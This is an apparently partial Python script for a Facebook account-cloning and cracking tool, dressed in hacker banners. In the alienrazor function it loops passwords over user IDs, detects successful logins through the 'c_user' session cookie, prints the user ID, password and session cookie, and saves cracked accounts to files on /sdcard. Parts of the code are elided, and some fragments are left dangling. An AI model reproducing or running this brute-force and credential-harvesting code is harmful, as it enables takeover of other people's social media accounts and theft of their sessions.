...
´´´´´´´´´´´´´´´´´´´´´´¶¶¶¶´´¶¶¶¶¶´´¶¶¶¶´´´´´´´´´´´´´´´´´´´´´
[•]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[•]
[•] AUTHOR    : RED OUPS { HACKEUR}
[•] FACEBOOK  : REDOUPTRICKEUR
[•] GITHUB    : REDOUPSTRICKEUR
[•] TOOL      : RANDOM CLONE  : VERSION : 0.49
[•]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[•]
                         .         \033[0;92m  
...
def menu():
    ...
    print ("\033[0;93mAUTHOR   : REDOUPS-HACKEUR")

    print ("\033[0;94mBD CLONE : FACEBOOK ")

    print ("\033[0;96mGITHUB   : REDOUPSTRICKEUR")
...
def gp():
    ...
    print(' [✓] OK Ids saved as REDOUPSHACKEUR-OK.txt')
    print(' [✓] CP Id Save as REDOUPSTRICKEUR-CP.txt')
    print('_____________________________\n')    




#_____________________________---REDOUPS HZCKEUR_____________________________----
...
def robi():
    ...
    print(' [✓] Crack process has been completed')
    print(' [✓] OK Ids saved as REDOUPSHACKEUR-OK.txt')
    print(' [✓] CP Id Save as REDOUPSHACKEUR-CP.txt')
    print('_____________________________\n')
...
def alienrazor(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[REDOUPSHACKEUR]-[%s/%s]-[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"[REDOUPSHACKEUR-OK] {uid}|{ps} \nCookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"[REDOUPSHACKEUR-CP] {cid}|{ps}")
                open('/sdcard/REDOUPSHACKEUR-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
